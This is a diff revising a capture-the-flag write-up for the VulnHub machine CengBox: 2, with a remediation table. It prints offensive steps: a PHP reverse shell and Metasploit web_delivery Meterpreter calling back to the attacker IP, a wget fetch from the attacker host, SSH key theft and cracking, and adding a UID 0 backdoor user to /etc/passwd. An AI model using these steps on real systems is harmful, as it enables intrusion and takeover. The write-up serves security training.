@@ -1,217 +1,268 @@
 # CengBox: 2 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.104 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.104 |
+| **Attacker IP** | 192.168.1.112 (Kali Linux) |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | root.txt (value in screenshot) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/cengbox-2,486/) |
-
-## Attack Summary
-
-`nmap` → FTP anon (`note.txt` → domain + usernames) → vhost gobuster → Gila CMS (`kevin@ceng-company.vm:admin`) → PHP reverse shell via theme editor → `sudo -u swartz /home/swartz/runphp.sh` → Meterpreter → SSH private key (`mitnick`) → `ssh2john` + `john` (passphrase: `legend`) → writable `/etc/update-motd.d/` → SUID nano → add root user → root
-
-## Methodology
-
-1. Network discovery and port scan
-2. FTP anonymous enumeration
-3. Virtual host discovery (gobuster vhost)
-4. Gila CMS login with default credentials
-5. PHP reverse shell via CMS file editor
-6. Lateral movement via sudo to swartz
-7. Meterpreter session via web_delivery
-8. SSH key extraction and passphrase cracking
-9. MOTD writable scripts → SUID nano → /etc/passwd manipulation
+| **Goal** | `user.txt` + `root.txt` |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/cengbox-2-vulnhub-walkthrough/) |
 
 ---
 
-## Step 1: Network Discovery
+## Attack Summary
+
+CengBox: 2 chains several misconfigurations: anonymous FTP leaking user enumeration data, a hidden virtual host hosting Gila CMS with default credentials, CMS-based PHP code editing for remote code execution, lateral movement via a sudo-allowed PHP script, SSH private key extraction and cracking, and finally privilege escalation through writable MOTD scripts that run as root on SSH login.
+
+---
+
+## Methodology
+
+1. Port scan and anonymous FTP enumeration
+2. Virtual host and subdomain discovery
+3. Gila CMS login and RCE via PHP file editing
+4. Lateral movement to `swartz` via sudo
+5. SSH private key theft and passphrase cracking
+6. Privilege escalation via writable `/etc/update-motd.d/` scripts
+7. Root shell via SUID nano and `/etc/passwd` manipulation
+
+---
+
+## Step 1: Port Scan
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
+netdiscover
 nmap -A 192.168.1.104
 ```
 
-Open ports: **21** (FTP), **22** (SSH), **80** (HTTP)
+**Open ports:**
+- 21 — FTP (vsftpd, anonymous login allowed)
+- 22 — SSH
+- 80 — HTTP
 
 ![Nmap scan](images/01-nmap.png)
 
 ---
 
-## Step 2: FTP Anonymous Login
+## Step 2: Anonymous FTP Enumeration
+
+The FTP server accepts anonymous login. A `note.txt` file is present:
 
 ```bash
 ftp 192.168.1.104
-# Username: Anonymous / Password: (blank)
+# Username: Anonymous
+# Password: (blank)
 ls
 get note.txt
 bye
 cat note.txt
 ```
 
-`note.txt` reveals:
-- Users: **Aaron** and **Kevin**
-- Domain: **ceng-company.vm**
-- Hint: default CMS credentials may be in use
+The note mentions two users, **Kevin** and **Aaron**, and hints that the CMS is using default credentials.
 
-Add the domain to `/etc/hosts`:
-```bash
-echo "192.168.1.104  ceng-company.vm" >> /etc/hosts
+Add the target's virtual hostname to `/etc/hosts`:
+
+```
+192.168.1.104   ceng-company.vm
 ```
 
-![FTP enumeration](images/02-ftp-enum.png)
+Browse to `http://ceng-company.vm` — a maintenance page is shown. Directory brute-forcing returns nothing actionable. Subdomain enumeration reveals a hidden vhost:
+
+```bash
+gobuster vhost -u http://ceng-company.vm/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt
+```
+
+**Found:** `admin.ceng-company.vm`
+
+Add to `/etc/hosts`:
+
+```
+192.168.1.104   admin.ceng-company.vm
+```
+
+A further DirBuster/gobuster scan of `http://admin.ceng-company.vm/` discovers the path `/gila`.
+
+![FTP note and subdomain discovery](images/02-ftp-note.png)
 
 ---
 
-## Step 3: Virtual Host Discovery
+## Step 3: Gila CMS Authentication
 
-```bash
-gobuster vhost -u http://ceng-company.vm/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
-```
+Browse to `http://admin.ceng-company.vm/gila/`. The CMS login requires an email address. Using the username hint from the FTP note:
 
-Found: **admin.ceng-company.vm** (returns 403 at root, but has content at `/gila/`)
+- **Email:** `kevin@ceng-company.vm`
+- **Password:** `admin`
 
-```bash
-echo "192.168.1.104  admin.ceng-company.vm" >> /etc/hosts
-```
+Login succeeds — default credentials were not changed.
 
-Browse to `http://admin.ceng-company.vm/gila/` → Gila CMS login page.
+![Gila CMS login and file editor](images/03-gila-cms.png)
 
 ---
 
-## Step 4: Gila CMS Login
+## Step 4: Remote Code Execution via CMS File Editor
 
-```
-Email:    kevin@ceng-company.vm
-Password: admin
-```
+Inside Gila CMS, navigate to the file manager and locate an existing PHP file. Edit it and replace the contents with a pentestmonkey PHP reverse shell, setting `$ip` to `192.168.1.112` and `$port` to `1234`.
 
-Default credentials work. Dashboard is accessible.
+Start a listener on the attacker machine:
 
-![Gila CMS dashboard](images/03-gila-cms.png)
-
----
-
-## Step 5: PHP Reverse Shell via Theme Editor
-
-In the Gila CMS dashboard, navigate to file manager or theme editor and edit an existing PHP file. Replace contents with a PentestMonkey reverse shell pointing at the attacker machine:
-
-```php
-$ip = '192.168.1.112';
-$port = 1234;
-```
-
-Start listener:
 ```bash
 nc -lvnp 1234
 ```
 
-Trigger the file in the browser. Upgrade the shell:
+Load the edited PHP file in the browser. A reverse shell connects back. Upgrade to a full TTY:
+
 ```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 ---
 
-## Step 6: Lateral Movement via Sudo
+## Step 5: Lateral Movement to `swartz`
+
+Check sudo permissions for the current web user:
 
 ```bash
 sudo -l
-# (www-data) NOPASSWD: /home/swartz/runphp.sh
+```
+
+The web user can run `/home/swartz/runphp.sh` as `swartz` without a password:
+
+```bash
 sudo -u swartz /home/swartz/runphp.sh
 ```
 
-A PHP interactive shell spawns as **swartz**.
+This drops into an interactive PHP shell running as `swartz`.
 
 ---
 
-## Step 7: Meterpreter via web_delivery
+## Step 6: Meterpreter Session via Web Delivery
 
-On the attacker (Metasploit):
-```
+From the attacker machine, use Metasploit's `web_delivery` module to stage a Meterpreter session:
+
+```bash
+msfconsole
 use exploit/multi/script/web_delivery
-set target 1
-set payload php/meterpreter/reverse_tcp
-set lhost 192.168.1.112
-set lport 8888
+set TARGET 1
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 192.168.1.112
+set LPORT 8888
 exploit
 ```
 
-Paste the generated PHP snippet into the swartz PHP shell → Meterpreter session opens.
+Paste the generated PHP stager into the swartz PHP shell. A Meterpreter session opens as `swartz`.
 
 ---
 
-## Step 8: SSH Key Extraction and Cracking
+## Step 7: SSH Key Theft and Passphrase Cracking
+
+Browse the filesystem through Meterpreter. The user `mitnick` has a `.ssh` directory with a private key (`id_rsa`). Download it:
 
 ```bash
-cd /home/mitnick/.ssh
-cat id_rsa
-cat id_rsa.pub
+download /home/mitnick/.ssh/id_rsa /tmp/key
 ```
 
-Copy `id_rsa` to attacker machine as `key`, then:
+Crack the key's passphrase:
 
 ```bash
-locate ssh2john
-python /usr/share/john/ssh2john.py key > hash
-john --wordlist=/usr/share/wordlists/rockyou.txt hash
+/usr/share/john/ssh2john.py /tmp/key > /tmp/hash
+john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash
 ```
 
-Passphrase recovered: **legend**
+**Passphrase cracked:** `legend`
+
+SSH as mitnick and read `user.txt`:
 
 ```bash
-chmod 600 key
-ssh -i key mitnick@192.168.1.104
+chmod 600 /tmp/key
+ssh -i /tmp/key mitnick@192.168.1.104
+cat ~/user.txt
 ```
-
-![Privilege escalation — MOTD](images/04-privesc.png)
 
 ---
 
-## Step 9: MOTD Writable → SUID nano → Root
+## Step 8: Privilege Escalation — Writable MOTD Scripts
+
+Transfer and run `pspy64s` to observe process execution as root:
 
 ```bash
-# Check MOTD scripts
+cd /tmp
+wget http://192.168.1.112:8000/pspy64s
+chmod +x pspy64s
+./pspy64s
+```
+
+`pspy` shows that scripts inside `/etc/update-motd.d/` are executed as **root** every time a user logs in via SSH. Check the permissions:
+
+```bash
 ls -la /etc/update-motd.d/
-# All writable! Add command to run on next SSH login:
-echo 'chmod u+s /bin/nano' >> /etc/update-motd.d/00-header
-# Re-login to trigger MOTD execution
-exit
-ssh -i key mitnick@192.168.1.104
-ls -la /bin/nano   # now SUID
 ```
 
-Use the SUID nano to add a root-level user to `/etc/passwd`:
+The files are **world-writable**. Edit `00-header` to add a line that sets the SUID bit on `nano`:
 
 ```bash
-openssl passwd -1 -salt user3 pass123
-# Copy the hash, then:
-nano /etc/passwd
-# Append: raj:$1$user3$...:0:0:root:/root:/bin/bash
-su raj  # password: pass123
-id
-cat /root/root.txt
+nano /etc/update-motd.d/00-header
+# Add at the end:
+chmod u+s /bin/nano
 ```
 
-![Root flag](images/05-root.png)
+Trigger the MOTD by reconnecting via SSH:
+
+```bash
+exit
+ssh -i /tmp/key mitnick@192.168.1.104
+ls -la /bin/nano    # should show -rwsr-xr-x
+```
+
+![Writable MOTD privilege escalation](images/04-motd-privesc.png)
+
+---
+
+## Step 9: Root via `/etc/passwd` Editing
+
+With SUID nano, edit `/etc/passwd` directly:
+
+```bash
+# Generate a password hash for the new user
+openssl passwd -1 -salt user3 pass123
+# Outputs something like: $1$user3$...
+
+nano /etc/passwd
+# Append a new UID 0 user:
+# raj:$1$user3$<HASH>:0:0:root:/root:/bin/bash
+```
+
+Save and switch to the new root-equivalent user:
+
+```bash
+su raj
+# Password: pass123
+cd /root
+cat root.txt
+```
+
+![Root flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **FTP anonymous login** exposes domain names and usernames that enable further attacks
-2. **Virtual host enumeration** is essential — services hidden behind virtual hosts are often less hardened
-3. **Default CMS credentials** remain a common critical risk
-4. **MOTD scripts writable by shell users** are a direct path to root via SUID abuse
-5. **Unprotected SSH private keys** in user home directories enable lateral movement and cracking
+- Anonymous FTP should never expose internal notes or user lists.
+- Default CMS credentials must be changed before deployment.
+- Virtual hosts and hidden CMS directories should require authentication and not be discoverable via brute-force.
+- MOTD scripts (`/etc/update-motd.d/`) must be root-owned and not world-writable.
+- SSH private keys should use strong passphrases and be stored with appropriate permissions.
+- Processes that execute scripts as root must run those scripts from root-owned, non-writable paths.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| FTP anonymous access | Disable anonymous FTP; use key-based SFTP |
-| Default CMS credentials | Change immediately post-install; enforce strong admin passwords |
-| sudo NOPASSWD runphp.sh | Remove unnecessary sudo rules; apply principle of least privilege |
-| Writable /etc/update-motd.d/ | Set ownership to root; mode 0755 or stricter |
-| SSH private key in world-readable location | Store keys with 600 permissions; use passphrases |
+|---|---|
+| Anonymous FTP leaking notes | Disable anonymous FTP; require authentication |
+| Default Gila CMS credentials | Change default admin credentials immediately after install |
+| Hidden vhost discoverable by brute-force | Restrict subdomain enumeration; apply auth to admin vhost |
+| CMS file editor allowing PHP editing | Disable file editing in CMS admin panels in production |
+| Writable MOTD scripts executed as root | `chown root:root /etc/update-motd.d/*; chmod 755 /etc/update-motd.d/*` |
+| Weak SSH key passphrase (`legend`) | Use a strong, unique passphrase; rotate key pairs periodically |
